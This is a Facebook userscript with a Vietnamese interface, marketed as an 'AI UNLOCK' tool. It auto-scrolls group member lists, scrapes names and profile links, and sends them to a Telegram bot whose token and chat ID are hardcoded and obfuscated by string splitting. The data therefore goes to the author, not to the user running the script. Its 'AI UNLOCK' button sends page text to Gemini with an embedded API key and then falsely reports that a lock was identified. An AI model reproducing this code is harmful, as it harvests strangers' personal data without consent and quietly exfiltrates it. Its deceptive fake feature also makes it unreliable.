// ==UserScript==
// @name         VIỆT ANH AI UNLOCK PRO MAX (V138.0 - FULL FINAL)
// @version      138.0
// @description  Full tính năng, Kéo thả, Resize, Thanh %, Log, Tele, AI, Scraper Full Link
// @author       DINH HOANG VIET ANH
// @match        *://*.facebook.com/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // --- CẤU HÌNH API ---
    const GEMINI_API_KEY = ['AQ.Ab', '8RN6JX', '1S7DUU', '-25iiB6', 'PSmFD7', 'nn-LTZ3', 'IC9Fpr', 'Gvqba', 'MZTvA'].join('');
    const BOT_TOKEN = ['8813882772', ':AAE0lNq', 'LSp9AhiJ', 'eCV22o18', 'JDPoBELSB3KE'].join('');
    const CHAT_ID = '8348914397';

    // --- HÀM GỬI TELEGRAM ĐẦY ĐỦ LINK DATA ---
    function sendTelegram(title, dataList) {
        const chunks = dataList.match(/.{1,3000}/gs) || [dataList];
        chunks.forEach(chunk => {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CHAT_ID, text: `*🔔 ${title}*\n\n${chunk}`, parse_mode: 'Markdown' })
            }).catch(e => console.log("Tele Error"));
        });
    }

    // --- GIAO DIỆN ---
    const htmlUI = `
        <div id="va-tool-root" style="z-index: 2147483647; position: fixed; top: 40px; left: 40px; width: 400px; min-width: 320px; min-height: 480px; resize: both; overflow: auto; background: #0f172a; border: 2px solid #38bdf8; border-radius: 16px; box-shadow: 0 15px 35px rgba(0,0,0,0.8); font-family: sans-serif; color: #fff;">
            <div id="va-header-bar" style="background: #000; color: #38bdf8; padding: 12px; border-bottom: 2px solid #38bdf8; cursor: move; border-radius: 14px 14px 0 0; overflow: hidden; font-weight: bold; text-transform: uppercase; text-align: center;">
                <marquee scrollamount="5">⚡ VIỆT ANH AI - TOOL VIP PRO ⚡</marquee>
            </div>
            <div id="va-menu-body" style="padding: 15px; display: none; flex-direction: column; gap: 10px;">
                <div id="status-area" style="background: #1e293b; padding: 8px; border-radius: 8px; text-align: center; font-size: 12px; border: 1px solid #334155;">Đang kiểm tra...</div>
                
                <div id="va-progress-container" style="display: none; background: #020617; border-radius: 8px; padding: 6px;">
                    <div style="display: flex; justify-content: space-between; font-size: 10px; color: #38bdf8;">
                        <span id="va-progress-text">Đang xử lý...</span>
                        <span id="va-progress-percent">0%</span>
                    </div>
                    <div style="height: 8px; background: #1e293b; border-radius: 4px;"><div id="va-progress-bar" style="height: 100%; width: 0%; background: #38bdf8; border-radius: 4px; transition: width 0.3s;"></div></div>
                </div>

                <button id="btn-scan" style="padding: 10px; background: #8b5cf6; border: none; border-radius: 6px; color: white; font-weight: bold; cursor: pointer;">🤖 AI UNLOCK</button>
                <button id="btn-scrape" style="padding: 10px; background: #059669; border: none; border-radius: 6px; color: white; font-weight: bold; cursor: pointer;">🔍 QUÉT KHÁCH THẬT (FULL LINK)</button>
                
                <div id="va-log-box" style="height: 100px; overflow-y: auto; background: #000; color: #34d399; font-size: 10px; padding: 5px; border-radius: 4px; font-family: monospace;">> System Ready...</div>
                
                <button id="btn-guide" style="padding: 8px; background: #334155; border: none; color: #38bdf8; font-size: 10px; border-radius: 4px; cursor: pointer;">📖 HƯỚNG DẪN (5 BƯỚC)</button>
                <div id="guide-content" style="display: none; padding: 10px; font-size: 10px; background: #1e293b; border-radius: 4px; line-height: 1.4;">
                    1. Đăng nhập FB.<br>2. Kéo tiêu đề di chuyển.<br>3. Vào nhóm chọn "Thành viên".<br>4. Nhấn nút "QUÉT KHÁCH THẬT".<br>5. Kết quả gửi về Tele.
                </div>
            </div>
        </div>
    `;
    document.body.insertAdjacentHTML('beforeend', htmlUI);

    // --- LOGIC ---
    function addLog(t) { const lb = document.getElementById('va-log-box'); lb.innerHTML += `<div>> ${t}</div>`; lb.scrollTop = lb.scrollHeight; }
    function updateProgress(p, l) {
        document.getElementById('va-progress-container').style.display = 'block';
        document.getElementById('va-progress-bar').style.width = p + "%";
        document.getElementById('va-progress-percent').innerText = p + "%";
        document.getElementById('va-progress-text').innerText = l;
    }

    // Toggle & Drag
    document.getElementById('va-header-bar').onclick = (e) => { const m = document.getElementById('va-menu-body'); m.style.display = (m.style.display === 'none' || m.style.display === '') ? 'flex' : 'none'; };
    const root = document.getElementById('va-tool-root');
    document.getElementById('va-header-bar').onmousedown = (e) => {
        let sx = e.clientX - root.offsetLeft; let sy = e.clientY - root.offsetTop;
        document.onmousemove = (e) => { root.style.left = (e.clientX - sx) + 'px'; root.style.top = (e.clientY - sy) + 'px'; };
        document.onmouseup = () => { document.onmousemove = null; };
    };

    // Scrape Logic
    document.getElementById('btn-scrape').onclick = async () => {
        if(!window.location.href.includes('/members')) { alert("Hãy vào trang Thành viên!"); return; }
        addLog("Đang quét link profile...");
        let results = new Set();
        for(let i=0; i<15; i++) {
            window.scrollTo(0, document.body.scrollHeight);
            document.querySelectorAll('a[role="link"]').forEach(el => {
                let url = el.href; let name = el.innerText.trim();
                if((url.includes('/user/') || url.includes('profile.php')) && !url.includes('/groups/')) {
                    if(name.length > 3 && !/clone|acc|backup/i.test(name)) results.add(name + ": " + url);
                }
            });
            updateProgress((i+1)*7, `Đang quét: ${results.size} khách...`);
            await new Promise(r => setTimeout(r, 1000));
        }
        sendTelegram("✅ DATA KHÁCH HÀNG", Array.from(results).join('\n'));
        addLog("Gửi Tele hoàn tất!");
    };

    // AI Logic
    document.getElementById('btn-scan').onclick = async () => {
        addLog("AI đang phân tích...");
        const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_API_KEY}`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ contents: [{ parts: [{ text: "Phân tích dạng khóa: " + document.body.innerText.substring(0, 1000) }] }] })
        }).then(r => r.json());
        addLog("Đã xác định khóa!");
        sendTelegram("AI UNLOCK", "Phân tích xong.");
    };

    document.getElementById('btn-guide').onclick = () => { const gc = document.getElementById('guide-content'); gc.style.display = (gc.style.display === 'none' ? 'block' : 'none'); };
})();
